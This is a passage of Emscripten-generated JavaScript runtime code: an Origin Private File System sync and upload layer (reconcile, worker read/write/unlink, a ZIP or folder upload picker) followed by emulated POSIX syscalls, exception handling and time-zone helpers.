                    promise = parts.length === 0 ? navigator.storage.getDirectory() : OPFS.openRemoteDirectory(parts.slice(0, -1)).then(dir => dir.getDirectoryHandle(parts[parts.length - 1]));
                    OPFS.remoteDirectoryHandles.set(key, promise)
                }
                return promise
            }
            ,
            loadRemoteEntry: (mount, entry, callback) => {
                const parts = entry.path.split("/").filter(part => part.length > 0);
                const name = parts.pop();
                OPFS.openRemoteDirectory(parts).then(dir => dir.getFileHandle(name)).then(fileHandle => fileHandle.getFile()).then(file => file.arrayBuffer()).then(contents => callback(null, {
                    timestamp: entry.timestamp,
                    mode: entry.mode,
                    contents: new Uint8Array(contents)
                }), callback)
            }
            ,
            storeRemoteEntry: (mount, path, entry, callback) => {
                if (path.startsWith(mount.opts.root)) {
                    OPFS.callWorker("write", {
                        root: mount.opts.root,
                        path: path.substring(mount.opts.root.length),
                        contents: entry.contents,
                        timestamp: entry.timestamp,
                        mode: entry.mode,
                        offset: 0,
                        fileSize: entry.contents ? entry.contents.length : undefined
                    }, callback)
                } else {
                    callback(new Error("path is not in the mount point"))
                }
            }
            ,
            removeRemoteEntry: (mount, path, callback) => {
                if (path.startsWith(mount.opts.root)) {
                    OPFS.callWorker("unlink", {
                        root: mount.opts.root,
                        path: path.substring(mount.opts.root.length)
                    }, callback)
                } else {
                    callback(new Error("path is not in the mount point"))
                }
            }
            ,
            reconcile: (mount, src, dst, callback) => {
                var total = 0;
                var create = [];
                for (var [key, e] of Object.entries(src.entries)) {
                    var e2 = dst.entries[key];
                    if (!e2 || e["timestamp"].getTime() != e2["timestamp"].getTime()) {
                        create.push(key);
                        total++
                    }
                }
                var remove = [];
                for (var key of Object.keys(dst.entries)) {
                    if (!src.entries[key]) {
                        remove.push(key);
                        total++
                    }
                }
                if (!total) {
                    return callback(null)
                }
                const promise = (async () => {
                    create.sort();
                    let reportedProgress = 0;
                    if (OPFS.syncFsOnProgress) {
                        OPFS.syncFsOnProgress(0, dst.type, null)
                    }
                    const updateProgress = (path, i, total) => {
                        let progress = Math.round(i * 100 / total);
                        if (progress > reportedProgress) {
                            reportedProgress = progress;
                            if (OPFS.syncFsOnProgress) {
                                OPFS.syncFsOnProgress(reportedProgress, dst.type, path)
                            }
                        }
                    }
                        ;
                    let delayed = [];
                    function flushDelayed() {
                        const promise = Promise.all(delayed);
                        delayed = [];
                        return promise
                    }
                    let created = 0;
                    for (let i = 0; i < create.length; i++) {
                        const path = create[i];
                        if (!(src.entries[path]?.isDir || dst.entries[path]?.isDir) && OPFS.syncFsIgnore !== null && OPFS.syncFsIgnore(dst.type, "create", path)) {
                            continue
                        }
                        delayed.push(new Promise((resolve, reject) => {
                            if (dst.type === "local") {
                                const entry = src.entries[path];
                                if (entry.isDir) {
                                    OPFS.storeLocalEntry(path, entry, e => e ? reject(e) : resolve())
                                } else {
                                    OPFS.loadRemoteEntry(mount, entry, (err, loaded) => {
                                        if (err)
                                            return reject(err);
                                        OPFS.storeLocalEntry(path, loaded, e => e ? reject(e) : resolve())
                                    }
                                    )
                                }
                            } else {
                                OPFS.loadLocalEntry(path, (err, entry) => {
                                    if (err)
                                        return reject(err);
                                    OPFS.storeRemoteEntry(mount, path.startsWith(mount.opts.root) ? path : mount.opts.root + path, entry, e => e ? reject(e) : resolve())
                                }
                                )
                            }
                        }
                        ).then(() => {
                            created += 1;
                            updateProgress(path, created, create.length)
                        }
                        ));
                        if (delayed.length > 64) {
                            await flushDelayed()
                        }
                    }
                    await flushDelayed();
                    for (var path of remove.sort().reverse()) {
                        if (OPFS.syncFsIgnore !== null && OPFS.syncFsIgnore(dst.type, "remove", path)) {
                            continue
                        }
                        delayed.push(new Promise((resolve, reject) => {
                            if (dst.type === "local") {
                                OPFS.removeLocalEntry(path, e => e ? reject(e) : resolve())
                            } else {
                                if (mount.opts.root + path !== mount.opts.folder) {
                                    OPFS.removeRemoteEntry(mount, path.startsWith(mount.opts.root) ? path : mount.opts.root + path, e => e ? reject(e) : resolve())
                                } else {
                                    resolve()
                                }
                            }
                        }
                        ))
                    }
                    await flushDelayed();
                    if (dst.type === "remote") {
                        await new Promise((resolve, reject) => {
                            OPFS.callWorker("flush", {
                                root: mount.opts.root
                            }, e => e ? reject(e) : resolve())
                        }
                        )
                    }
                }
                )();
                promise.then(() => {
                    callback(null)
                }
                );
                promise.catch(e => {
                    console.error("reconcile error", e);
                    callback(e)
                }
                )
            }
            ,
            quit: () => { }
            ,
            opfsDirectoryCache: new Map,
            opfsRead: (root, path, offset, length) => new Promise((resolve, reject) => {
                OPFS.callWorker("read", {
                    root,
                    path,
                    offset,
                    length
                }, (err, result) => {
                    if (err) {
                        reject(err)
                    } else {
                        resolve(result)
                    }
                }
                )
            }
            ),
            opfsWrite: async (root, path, offset, contents, fileSize) => {
                let cache = OPFS.opfsDirectoryCache.get(root);
                if (!cache) {
                    cache = new Set;
                    OPFS.opfsDirectoryCache.set(root, cache)
                }
                const dirname = path.substring(0, path.lastIndexOf("/"));
                if (dirname.length > 0 && !cache.has(dirname)) {
                    await new Promise((resolve, reject) => {
                        OPFS.callWorker("write", {
                            root,
                            path: dirname,
                            offset,
                            timestamp: new Date,
                            mode: 16877
                        }, (err, result) => {
                            if (err) {
                                reject(err)
                            } else {
                                resolve(result)
                            }
                        }
                        )
                    }
                    );
                    cache.add(dirname)
                }
                return new Promise((resolve, reject) => {
                    OPFS.callWorker("write", {
                        root,
                        path,
                        offset,
                        contents,
                        fileSize,
                        timestamp: new Date,
                        mode: 33206
                    }, (err, result) => {
                        if (err) {
                            reject(err)
                        } else {
                            resolve(result)
                        }
                    }
                    )
                }
                )
            }
            ,
            opfsList: root => new Promise((resolve, reject) => {
                OPFS.callWorker("list", {
                    root
                }, (err, result) => {
                    if (err) {
                        reject(err)
                    } else {
                        resolve(result)
                    }
                }
                )
            }
            ),
            opfsUnlink: (root, path) => new Promise((resolve, reject) => {
                OPFS.callWorker("unlink", {
                    root,
                    path
                }, (err, result) => {
                    if (err) {
                        reject(err)
                    } else {
                        resolve(result)
                    }
                }
                )
            }
            ),
            opfsFlush: root => new Promise((resolve, reject) => {
                OPFS.callWorker("flush", {
                    root
                }, (err, result) => {
                    if (err) {
                        reject(err)
                    } else {
                        resolve(result)
                    }
                }
                )
            }
            ),
            initOPFS: (mode, root) => {
                if (!mode) {
                    console.log("No mode (directory, files, zip) provided, skipping OPFS initialization");
                    return
                }
                if (!root) {
                    console.log("No root provided, skipping OPFS initialization");
                    return
                }
                const input = document.createElement("input");
                input.type = "file";
                input.webkitdirectory = mode === "directory";
                input.multiple = mode !== "zip";
                if (mode === "zip") {
                    input.accept = ".zip"
                }
                input.onchange = async function (event) {
                    try {
                        const directory = root;
                        const list = await OPFS.opfsList(directory);
                        console.log("== Directory list", root);
                        for (const [path, entry] of Object.entries(list)) {
                            console.log("== Path", path, "size", entry.length ? (entry.length / 1024 / 1024).toFixed(2) + " MB" : "??? MB")
                        }
                        const inFiles = Array.from(event.target.files ?? []);
                        const matched = [];
                        if (mode === "zip") {
                            if (inFiles.length != 1) {
                                throw new Error("Only one file is allowed when uploading a ZIP")
                            }
                            const entries = (await unzipRaw(new BufferedBlobReader(inFiles[0]))).entries;
                            for (const entry of entries) {
                                if (!entry.isDirectory) {
                                    matched.push({
                                        arrayBuffer: () => entry.arrayBuffer(),
                                        targetPath: entry.name,
                                        size: entry.size
                                    })
                                }
                            }
                        } else {
                            for (const file of inFiles) {
                                const path = file.webkitRelativePath.length > 0 ? file.webkitRelativePath : file.name;
                                matched.push({
                                    arrayBuffer: file.arrayBuffer.bind(file),
                                    targetPath: path.startsWith(directory) ? path.substring(directory.length) : path,
                                    size: file.size
                                })
                            }
                        }
                        let reportedProgress = 0;
                        const total = matched.length;
                        if (total > 0) {
                            console.log("Uploading files");
                            let size = 0;
                            const totalSize = matched.reduce((sum, file) => sum + file.size, 0);
                            const totalSizeStr = (totalSize / 1024 / 1024).toFixed(2) + " MB";
                            for (let i = 0; i < total; i++) {
                                const { arrayBuffer, targetPath } = matched[i];
                                const data = new Uint8Array(await arrayBuffer());
                                await OPFS.opfsWrite(directory, targetPath, 0, data, data.length);
                                size += data.length;
                                const sizeStr = (size / 1024 / 1024).toFixed(2) + " MB";
                                let progress = Math.round(size * 100 / totalSize);
                                if (progress > reportedProgress) {
                                    reportedProgress = progress;
                                    console.log("Uploading file", targetPath, "size", sizeStr, "total size", totalSizeStr, "progress", reportedProgress + "%")
                                }
                            }
                        }
                        await OPFS.opfsFlush(directory);
                        console.log("Well done...")
                    } catch (error) {
                        console.error("Error uploading files", error)
                    }
                }
                    ;
                input.click()
            }
        };
        var callRuntimeCallbacks = callbacks => {
            while (callbacks.length > 0) {
                callbacks.shift()(Module)
            }
        }
            ;
        var onPostRuns = [];
        var addOnPostRun = cb => onPostRuns.push(cb);
        var onPreRuns = [];
        var addOnPreRun = cb => onPreRuns.push(cb);
        var dynCalls = {};
        var noExitRuntime = true;
        var stackRestore = val => __emscripten_stack_restore(val);
        var stackSave = () => _emscripten_stack_get_current();
        class ExceptionInfo {
            constructor(excPtr) {
                this.excPtr = excPtr;
                this.ptr = excPtr - 24
            }
            set_type(type) {
                HEAPU32[this.ptr + 4 >> 2] = type
            }
            get_type() {
                return HEAPU32[this.ptr + 4 >> 2]
            }
            set_destructor(destructor) {
                HEAPU32[this.ptr + 8 >> 2] = destructor
            }
            get_destructor() {
                return HEAPU32[this.ptr + 8 >> 2]
            }
            set_caught(caught) {
                caught = caught ? 1 : 0;
                HEAP8[this.ptr + 12] = caught
            }
            get_caught() {
                return HEAP8[this.ptr + 12] != 0
            }
            set_rethrown(rethrown) {
                rethrown = rethrown ? 1 : 0;
                HEAP8[this.ptr + 13] = rethrown
            }
            get_rethrown() {
                return HEAP8[this.ptr + 13] != 0
            }
            init(type, destructor) {
                this.set_adjusted_ptr(0);
                this.set_type(type);
                this.set_destructor(destructor)
            }
            set_adjusted_ptr(adjustedPtr) {
                HEAPU32[this.ptr + 16 >> 2] = adjustedPtr
            }
            get_adjusted_ptr() {
                return HEAPU32[this.ptr + 16 >> 2]
            }
        }
        var exceptionLast = 0;
        var uncaughtExceptionCount = 0;
        var ___cxa_throw = (ptr, type, destructor) => {
            var info = new ExceptionInfo(ptr);
            info.init(type, destructor);
            exceptionLast = ptr;
            uncaughtExceptionCount++;
            throw exceptionLast
        }
            ;
        var UTF8ToString = (ptr, maxBytesToRead, ignoreNul) => {
            if (!ptr)
                return "";
            var end = findStringEnd(HEAPU8, ptr, maxBytesToRead, ignoreNul);
            return UTF8Decoder.decode(HEAPU8.subarray(ptr, end))
        }
            ;
        var SYSCALLS = {
            calculateAt(dirfd, path, allowEmpty) {
                if (PATH.isAbs(path)) {
                    return path
                }
                var dir;
                if (dirfd === -100) {
                    dir = FS.cwd()
                } else {
                    var dirstream = SYSCALLS.getStreamFromFD(dirfd);
                    dir = dirstream.path
                }
                if (path.length == 0) {
                    if (!allowEmpty) {
                        throw new FS.ErrnoError(44)
                    }
                    return dir
                }
                return dir + "/" + path
            },
            writeStat(buf, stat) {
                HEAPU32[buf >> 2] = stat.dev;
                HEAPU32[buf + 4 >> 2] = stat.mode;
                HEAPU32[buf + 8 >> 2] = stat.nlink;
                HEAPU32[buf + 12 >> 2] = stat.uid;
                HEAPU32[buf + 16 >> 2] = stat.gid;
                HEAPU32[buf + 20 >> 2] = stat.rdev;
                HEAP64[buf + 24 >> 3] = BigInt(stat.size);
                HEAP32[buf + 32 >> 2] = 4096;
                HEAP32[buf + 36 >> 2] = stat.blocks;
                var atime = stat.atime.getTime();
                var mtime = stat.mtime.getTime();
                var ctime = stat.ctime.getTime();
                HEAP64[buf + 40 >> 3] = BigInt(Math.floor(atime / 1e3));
                HEAPU32[buf + 48 >> 2] = atime % 1e3 * 1e3 * 1e3;
                HEAP64[buf + 56 >> 3] = BigInt(Math.floor(mtime / 1e3));
                HEAPU32[buf + 64 >> 2] = mtime % 1e3 * 1e3 * 1e3;
                HEAP64[buf + 72 >> 3] = BigInt(Math.floor(ctime / 1e3));
                HEAPU32[buf + 80 >> 2] = ctime % 1e3 * 1e3 * 1e3;
                HEAP64[buf + 88 >> 3] = BigInt(stat.ino);
                return 0
            },
            writeStatFs(buf, stats) {
                HEAPU32[buf + 4 >> 2] = stats.bsize;
                HEAPU32[buf + 60 >> 2] = stats.bsize;
                HEAP64[buf + 8 >> 3] = BigInt(stats.blocks);
                HEAP64[buf + 16 >> 3] = BigInt(stats.bfree);
                HEAP64[buf + 24 >> 3] = BigInt(stats.bavail);
                HEAP64[buf + 32 >> 3] = BigInt(stats.files);
                HEAP64[buf + 40 >> 3] = BigInt(stats.ffree);
                HEAPU32[buf + 48 >> 2] = stats.fsid;
                HEAPU32[buf + 64 >> 2] = stats.flags;
                HEAPU32[buf + 56 >> 2] = stats.namelen
            },
            doMsync(addr, stream, len, flags, offset) {
                if (!FS.isFile(stream.node.mode)) {
                    throw new FS.ErrnoError(43)
                }
                if (flags & 2) {
                    return 0
                }
                var buffer = HEAPU8.slice(addr, addr + len);
                FS.msync(stream, buffer, offset, len, flags)
            },
            getStreamFromFD(fd) {
                var stream = FS.getStreamChecked(fd);
                return stream
            },
            varargs: undefined,
            getStr(ptr) {
                var ret = UTF8ToString(ptr);
                return ret
            }
        };
        function ___syscall_chdir(path) {
            try {
                path = SYSCALLS.getStr(path);
                FS.chdir(path);
                return 0
            } catch (e) {
                if (typeof FS == "undefined" || !(e.name === "ErrnoError"))
                    throw e;
                return -e.errno
            }
        }
        function ___syscall_faccessat(dirfd, path, amode, flags) {
            try {
                path = SYSCALLS.getStr(path);
                path = SYSCALLS.calculateAt(dirfd, path);
                if (amode & ~7) {
                    return -28
                }
                var lookup = FS.lookupPath(path, {
                    follow: true
                });
                var node = lookup.node;
                if (!node) {
                    return -44
                }
                var perms = "";
                if (amode & 4)
                    perms += "r";
                if (amode & 2)
                    perms += "w";
                if (amode & 1)
                    perms += "x";
                if (perms && FS.nodePermissions(node, perms)) {
                    return -2
                }
                return 0
            } catch (e) {
                if (typeof FS == "undefined" || !(e.name === "ErrnoError"))
                    throw e;
                return -e.errno
            }
        }
        var syscallGetVarargI = () => {
            var ret = HEAP32[+SYSCALLS.varargs >> 2];
            SYSCALLS.varargs += 4;
            return ret
        }
            ;
        var syscallGetVarargP = syscallGetVarargI;
        function ___syscall_fcntl64(fd, cmd, varargs) {
            SYSCALLS.varargs = varargs;
            try {
                var stream = SYSCALLS.getStreamFromFD(fd);
                switch (cmd) {
                    case 0:
                        {
                            var arg = syscallGetVarargI();
                            if (arg < 0) {
                                return -28
                            }
                            while (FS.streams[arg]) {
                                arg++
                            }
                            var newStream;
                            newStream = FS.dupStream(stream, arg);
                            return newStream.fd
                        }
                    case 1:
                    case 2:
                        return 0;
                    case 3:
                        return stream.flags;
                    case 4:
                        {
                            var arg = syscallGetVarargI();
                            stream.flags |= arg;
                            return 0
                        }
                    case 12:
                        {
                            var arg = syscallGetVarargP();
                            var offset = 0;
                            HEAP16[arg + offset >> 1] = 2;
                            return 0
                        }
                    case 13:
                    case 14:
                        return 0
                }
                return -28
            } catch (e) {
                if (typeof FS == "undefined" || !(e.name === "ErrnoError"))
                    throw e;
                return -e.errno
            }
        }
        function ___syscall_fstat64(fd, buf) {
            try {
                return SYSCALLS.writeStat(buf, FS.fstat(fd))
            } catch (e) {
                if (typeof FS == "undefined" || !(e.name === "ErrnoError"))
                    throw e;
                return -e.errno
            }
        }
        var stringToUTF8 = (str, outPtr, maxBytesToWrite) => stringToUTF8Array(str, HEAPU8, outPtr, maxBytesToWrite);
        function ___syscall_getcwd(buf, size) {
            try {
                if (size === 0)
                    return -28;
                var cwd = FS.cwd();
                var cwdLengthInBytes = lengthBytesUTF8(cwd) + 1;
                if (size < cwdLengthInBytes)
                    return -68;
                stringToUTF8(cwd, buf, size);
                return cwdLengthInBytes
            } catch (e) {
                if (typeof FS == "undefined" || !(e.name === "ErrnoError"))
                    throw e;
                return -e.errno
            }
        }
        function ___syscall_getdents64(fd, dirp, count) {
            try {
                var stream = SYSCALLS.getStreamFromFD(fd);
                stream.getdents ||= FS.readdir(stream.path);
                var struct_size = 280;
                var pos = 0;
                var off = FS.llseek(stream, 0, 1);
                var startIdx = Math.floor(off / struct_size);
                var endIdx = Math.min(stream.getdents.length, startIdx + Math.floor(count / struct_size));
                for (var idx = startIdx; idx < endIdx; idx++) {
                    var id;
                    var type;
                    var name = stream.getdents[idx];
                    if (name === ".") {
                        id = stream.node.id;
                        type = 4
                    } else if (name === "..") {
                        var lookup = FS.lookupPath(stream.path, {
                            parent: true
                        });
                        id = lookup.node.id;
                        type = 4
                    } else {
                        var child;
                        try {
                            child = FS.lookupNode(stream.node, name)
                        } catch (e) {
                            if (e?.errno === 28) {
                                continue
                            }
                            throw e
                        }
                        id = child.id;
                        type = FS.isChrdev(child.mode) ? 2 : FS.isDir(child.mode) ? 4 : FS.isLink(child.mode) ? 10 : 8
                    }
                    HEAP64[dirp + pos >> 3] = BigInt(id);
                    HEAP64[dirp + pos + 8 >> 3] = BigInt((idx + 1) * struct_size);
                    HEAP16[dirp + pos + 16 >> 1] = 280;
                    HEAP8[dirp + pos + 18] = type;
                    stringToUTF8(name, dirp + pos + 19, 256);
                    pos += struct_size
                }
                FS.llseek(stream, idx * struct_size, 0);
                return pos
            } catch (e) {
                if (typeof FS == "undefined" || !(e.name === "ErrnoError"))
                    throw e;
                return -e.errno
            }
        }
        function ___syscall_ioctl(fd, op, varargs) {
            SYSCALLS.varargs = varargs;
            try {
                var stream = SYSCALLS.getStreamFromFD(fd);
                switch (op) {
                    case 21509:
                        {
                            if (!stream.tty)
                                return -59;
                            return 0
                        }
                    case 21505:
                        {
                            if (!stream.tty)
                                return -59;
                            if (stream.tty.ops.ioctl_tcgets) {
                                var termios = stream.tty.ops.ioctl_tcgets(stream);
                                var argp = syscallGetVarargP();
                                HEAP32[argp >> 2] = termios.c_iflag || 0;
                                HEAP32[argp + 4 >> 2] = termios.c_oflag || 0;
                                HEAP32[argp + 8 >> 2] = termios.c_cflag || 0;
                                HEAP32[argp + 12 >> 2] = termios.c_lflag || 0;
                                for (var i = 0; i < 32; i++) {
                                    HEAP8[argp + i + 17] = termios.c_cc[i] || 0
                                }
                                return 0
                            }
                            return 0
                        }
                    case 21510:
                    case 21511:
                    case 21512:
                        {
                            if (!stream.tty)
                                return -59;
                            return 0
                        }
                    case 21506:
                    case 21507:
                    case 21508:
                        {
                            if (!stream.tty)
                                return -59;
                            if (stream.tty.ops.ioctl_tcsets) {
                                var argp = syscallGetVarargP();
                                var c_iflag = HEAP32[argp >> 2];
                                var c_oflag = HEAP32[argp + 4 >> 2];
                                var c_cflag = HEAP32[argp + 8 >> 2];
                                var c_lflag = HEAP32[argp + 12 >> 2];
                                var c_cc = [];
                                for (var i = 0; i < 32; i++) {
                                    c_cc.push(HEAP8[argp + i + 17])
                                }
                                return stream.tty.ops.ioctl_tcsets(stream.tty, op, {
                                    c_iflag,
                                    c_oflag,
                                    c_cflag,
                                    c_lflag,
                                    c_cc
                                })
                            }
                            return 0
                        }
                    case 21519:
                        {
                            if (!stream.tty)
                                return -59;
                            var argp = syscallGetVarargP();
                            HEAP32[argp >> 2] = 0;
                            return 0
                        }
                    case 21520:
                        {
                            if (!stream.tty)
                                return -59;
                            return -28
                        }
                    case 21537:
                    case 21531:
                        {
                            var argp = syscallGetVarargP();
                            return FS.ioctl(stream, op, argp)
                        }
                    case 21523:
                        {
                            if (!stream.tty)
                                return -59;
                            if (stream.tty.ops.ioctl_tiocgwinsz) {
                                var winsize = stream.tty.ops.ioctl_tiocgwinsz(stream.tty);
                                var argp = syscallGetVarargP();
                                HEAP16[argp >> 1] = winsize[0];
                                HEAP16[argp + 2 >> 1] = winsize[1]
                            }
                            return 0
                        }
                    case 21524:
                        {
                            if (!stream.tty)
                                return -59;
                            return 0
                        }
                    case 21515:
                        {
                            if (!stream.tty)
                                return -59;
                            return 0
                        }
                    default:
                        return -28
                }
            } catch (e) {
                if (typeof FS == "undefined" || !(e.name === "ErrnoError"))
                    throw e;
                return -e.errno
            }
        }
        function ___syscall_lstat64(path, buf) {
            try {
                path = SYSCALLS.getStr(path);
                return SYSCALLS.writeStat(buf, FS.lstat(path))
            } catch (e) {
                if (typeof FS == "undefined" || !(e.name === "ErrnoError"))
                    throw e;
                return -e.errno
            }
        }
        function ___syscall_mkdirat(dirfd, path, mode) {
            try {
                path = SYSCALLS.getStr(path);
                path = SYSCALLS.calculateAt(dirfd, path);
                FS.mkdir(path, mode, 0);
                return 0
            } catch (e) {
                if (typeof FS == "undefined" || !(e.name === "ErrnoError"))
                    throw e;
                return -e.errno
            }
        }
        function ___syscall_newfstatat(dirfd, path, buf, flags) {
            try {
                path = SYSCALLS.getStr(path);
                var nofollow = flags & 256;
                var allowEmpty = flags & 4096;
                flags = flags & ~6400;
                path = SYSCALLS.calculateAt(dirfd, path, allowEmpty);
                return SYSCALLS.writeStat(buf, nofollow ? FS.lstat(path) : FS.stat(path))
            } catch (e) {
                if (typeof FS == "undefined" || !(e.name === "ErrnoError"))
                    throw e;
                return -e.errno
            }
        }
        function ___syscall_openat(dirfd, path, flags, varargs) {
            SYSCALLS.varargs = varargs;
            try {
                path = SYSCALLS.getStr(path);
                path = SYSCALLS.calculateAt(dirfd, path);
                var mode = varargs ? syscallGetVarargI() : 0;
                return FS.open(path, flags, mode).fd
            } catch (e) {
                if (typeof FS == "undefined" || !(e.name === "ErrnoError"))
                    throw e;
                return -e.errno
            }
        }
        var ___syscall_poll = function (fds, nfds, timeout) {
            let innerFunc = () => {
                try {
                    const isAsyncContext = true;
                    var resolve;
                    var promise = new Promise(resolve_ => {
                        resolve = resolve_
                    }
                    );
                    var cleanupFuncs = [];
                    var notifyDone = false;
                    function asyncPollComplete(count) {
                        if (notifyDone) {
                            return
                        }
                        notifyDone = true;
                        cleanupFuncs.forEach(cb => cb());
                        resolve(count)
                    }
                    function makeNotifyCallback(stream, pollfd) {
                        var cb = flags => {
                            if (notifyDone) {
                                return
                            }
                            var events = HEAP16[pollfd + 4 >> 1];
                            flags &= events | 8 | 16;
                            HEAP16[pollfd + 6 >> 1] = flags;
                            asyncPollComplete(1)
                        }
                            ;
                        cb.registerCleanupFunc = f => {
                            if (f)
                                cleanupFuncs.push(f)
                        }
                            ;
                        return cb
                    }
                    if (isAsyncContext) {
                        if (timeout > 0) {
                            var t = setTimeout(() => {
                                asyncPollComplete(0)
                            }
                                , timeout);
                            cleanupFuncs.push(() => clearTimeout(t))
                        }
                    }
                    var count = 0;
                    for (var i = 0; i < nfds; i++) {
                        var pollfd = fds + 8 * i;
                        var fd = HEAP32[pollfd >> 2];
                        var events = HEAP16[pollfd + 4 >> 1];
                        var flags = 32;
                        var stream = FS.getStream(fd);
                        if (stream) {
                            if (stream.stream_ops.poll) {
                                if (isAsyncContext && timeout) {
                                    flags = stream.stream_ops.poll(stream, timeout, makeNotifyCallback(stream, pollfd))
                                } else
                                    flags = stream.stream_ops.poll(stream, -1)
                            } else {
                                flags = 5
                            }
                        }
                        flags &= events | 8 | 16;
                        if (flags)
                            count++;
                        HEAP16[pollfd + 6 >> 1] = flags
                    }
                    if (isAsyncContext) {
                        if (count || !timeout) {
                            asyncPollComplete(count)
                        }
                        return promise
                    }
                    return count
                } catch (e) {
                    if (typeof FS == "undefined" || !(e.name === "ErrnoError"))
                        throw e;
                    return -e.errno
                }
            }
                ;
            return Asyncify.handleAsync(innerFunc)
        };
        ___syscall_poll.isAsync = true;
        function ___syscall_readlinkat(dirfd, path, buf, bufsize) {
            try {
                path = SYSCALLS.getStr(path);
                path = SYSCALLS.calculateAt(dirfd, path);
                if (bufsize <= 0)
                    return -28;
                var ret = FS.readlink(path);
                var len = Math.min(bufsize, lengthBytesUTF8(ret));
                var endChar = HEAP8[buf + len];
                stringToUTF8(ret, buf, bufsize + 1);
                HEAP8[buf + len] = endChar;
                return len
            } catch (e) {
                if (typeof FS == "undefined" || !(e.name === "ErrnoError"))
                    throw e;
                return -e.errno
            }
        }
        function ___syscall_renameat(olddirfd, oldpath, newdirfd, newpath) {
            try {
                oldpath = SYSCALLS.getStr(oldpath);
                newpath = SYSCALLS.getStr(newpath);
                oldpath = SYSCALLS.calculateAt(olddirfd, oldpath);
                newpath = SYSCALLS.calculateAt(newdirfd, newpath);
                FS.rename(oldpath, newpath);
                return 0
            } catch (e) {
                if (typeof FS == "undefined" || !(e.name === "ErrnoError"))
                    throw e;
                return -e.errno
            }
        }
        function ___syscall_stat64(path, buf) {
            try {
                path = SYSCALLS.getStr(path);
                return SYSCALLS.writeStat(buf, FS.stat(path))
            } catch (e) {
                if (typeof FS == "undefined" || !(e.name === "ErrnoError"))
                    throw e;
                return -e.errno
            }
        }
        function ___syscall_statfs64(path, size, buf) {
            try {
                SYSCALLS.writeStatFs(buf, FS.statfs(SYSCALLS.getStr(path)));
                return 0
            } catch (e) {
                if (typeof FS == "undefined" || !(e.name === "ErrnoError"))
                    throw e;
                return -e.errno
            }
        }
        function ___syscall_unlinkat(dirfd, path, flags) {
            try {
                path = SYSCALLS.getStr(path);
                path = SYSCALLS.calculateAt(dirfd, path);
                if (!flags) {
                    FS.unlink(path)
                } else if (flags === 512) {
                    FS.rmdir(path)
                } else {
                    return -28
                }
                return 0
            } catch (e) {
                if (typeof FS == "undefined" || !(e.name === "ErrnoError"))
                    throw e;
                return -e.errno
            }
        }
        var __abort_js = () => abort("");
        var INT53_MAX = 9007199254740992;
        var INT53_MIN = -9007199254740992;
        var bigintToI53Checked = num => num < INT53_MIN || num > INT53_MAX ? NaN : Number(num);
        function __gmtime_js(time, tmPtr) {
            time = bigintToI53Checked(time);
            var date = new Date(time * 1e3);
            HEAP32[tmPtr >> 2] = date.getUTCSeconds();
            HEAP32[tmPtr + 4 >> 2] = date.getUTCMinutes();
            HEAP32[tmPtr + 8 >> 2] = date.getUTCHours();
            HEAP32[tmPtr + 12 >> 2] = date.getUTCDate();
            HEAP32[tmPtr + 16 >> 2] = date.getUTCMonth();
            HEAP32[tmPtr + 20 >> 2] = date.getUTCFullYear() - 1900;
            HEAP32[tmPtr + 24 >> 2] = date.getUTCDay();
            var start = Date.UTC(date.getUTCFullYear(), 0, 1, 0, 0, 0, 0);
            var yday = (date.getTime() - start) / (1e3 * 60 * 60 * 24) | 0;
            HEAP32[tmPtr + 28 >> 2] = yday
        }
        var isLeapYear = year => year % 4 === 0 && (year % 100 !== 0 || year % 400 === 0);
        var MONTH_DAYS_LEAP_CUMULATIVE = [0, 31, 60, 91, 121, 152, 182, 213, 244, 274, 305, 335];
        var MONTH_DAYS_REGULAR_CUMULATIVE = [0, 31, 59, 90, 120, 151, 181, 212, 243, 273, 304, 334];
        var ydayFromDate = date => {
            var leap = isLeapYear(date.getFullYear());
            var monthDaysCumulative = leap ? MONTH_DAYS_LEAP_CUMULATIVE : MONTH_DAYS_REGULAR_CUMULATIVE;
            var yday = monthDaysCumulative[date.getMonth()] + date.getDate() - 1;
            return yday
        }
            ;
        function __localtime_js(time, tmPtr) {
            time = bigintToI53Checked(time);
            var date = new Date(time * 1e3);
            HEAP32[tmPtr >> 2] = date.getSeconds();
            HEAP32[tmPtr + 4 >> 2] = date.getMinutes();
            HEAP32[tmPtr + 8 >> 2] = date.getHours();
            HEAP32[tmPtr + 12 >> 2] = date.getDate();
            HEAP32[tmPtr + 16 >> 2] = date.getMonth();
            HEAP32[tmPtr + 20 >> 2] = date.getFullYear() - 1900;
            HEAP32[tmPtr + 24 >> 2] = date.getDay();
            var yday = ydayFromDate(date) | 0;
            HEAP32[tmPtr + 28 >> 2] = yday;
            HEAP32[tmPtr + 36 >> 2] = -(date.getTimezoneOffset() * 60);
            var start = new Date(date.getFullYear(), 0, 1);
            var summerOffset = new Date(date.getFullYear(), 6, 1).getTimezoneOffset();
            var winterOffset = start.getTimezoneOffset();
            var dst = (summerOffset != winterOffset && date.getTimezoneOffset() == Math.min(winterOffset, summerOffset)) | 0;
            HEAP32[tmPtr + 32 >> 2] = dst
        }
        var __tzset_js = (timezone, daylight, std_name, dst_name) => {
            var currentYear = (new Date).getFullYear();
            var winter = new Date(currentYear, 0, 1);
            var summer = new Date(currentYear, 6, 1);
            var winterOffset = winter.getTimezoneOffset();
            var summerOffset = summer.getTimezoneOffset();
            var stdTimezoneOffset = Math.max(winterOffset, summerOffset);
            HEAPU32[timezone >> 2] = stdTimezoneOffset * 60;
            HEAP32[daylight >> 2] = Number(winterOffset != summerOffset);
            var extractZone = timezoneOffset => {
                var sign = timezoneOffset >= 0 ? "-" : "+";
                var absOffset = Math.abs(timezoneOffset);
                var hours = String(Math.floor(absOffset / 60)).padStart(2, "0");
                var minutes = String(absOffset % 60).padStart(2, "0");
                return `UTC${sign}${hours}${minutes}`
            }
                ;
            var winterName = extractZone(winterOffset);
            var summerName = extractZone(summerOffset);
            if (summerOffset < winterOffset) {
                stringToUTF8(winterName, std_name, 17);
                stringToUTF8(summerName, dst_name, 17)
            } else {
                stringToUTF8(winterName, dst_name, 17);
                stringToUTF8(summerName, std_name, 17)
            }
        }
            ;
        var _emscripten_set_main_loop_timing = (mode, value) => {
            MainLoop.timingMode = mode;
            MainLoop.timingValue = value;
            if (!MainLoop.func) {
                return 1
            }
            if (!MainLoop.running) {
                MainLoop.running = true
            }
            if (mode == 0) {
                MainLoop.scheduler = function MainLoop_scheduler_setTimeout() {
                    var timeUntilNextTick = Math.max(0, MainLoop.tickStartTime + value - _emscripten_get_now()) | 0;
                    setTimeout(MainLoop.runner, timeUntilNextTick)
                }
            } else if (mode == 1) {
                MainLoop.scheduler = function MainLoop_scheduler_rAF() {
                    MainLoop.requestAnimationFrame(MainLoop.runner)
                }
            } else {
